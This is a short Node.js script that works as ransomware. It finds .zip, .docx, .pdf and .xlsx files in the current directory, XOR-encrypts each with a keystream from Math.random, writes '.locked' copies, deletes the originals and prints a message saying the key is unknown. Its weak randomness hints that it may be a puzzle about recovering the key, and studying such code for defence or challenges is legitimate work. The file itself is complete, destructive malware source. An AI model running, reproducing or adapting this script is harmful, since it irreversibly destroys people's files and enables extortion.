let fs = require('fs');
var path = require('path')

function random_hex() {
    return Math.random()
        .toString(16)
        .substr(2)
        .padEnd(13, '0')
        .padStart(16, '0');
}

function encrypt_file(file) {
    let contents = fs.readFileSync(file);
    let keystream = Buffer.from('');
    while (keystream.length < contents.length) {
        tmp = Buffer.from(random_hex(), 'hex');
        keystream = Buffer.concat([keystream, tmp]);
    }
    for (let i = 0; i < contents.length; i++) {
        contents.writeUInt8(contents[i] ^ keystream[i], i);
    }
    fs.writeFileSync(file + '.locked', contents);
    fs.unlinkSync(file);
}

let ext = ['.zip', '.docx', '.pdf', '.xlsx'];
let files = fs.readdirSync('.');
for (let i = 0; i < files.length; i++) {
    if (ext.includes(path.extname(files[i]))) {
        encrypt_file(files[i]);
    }
}

console.log('I DONT KNOW THE KEY EITHER :(');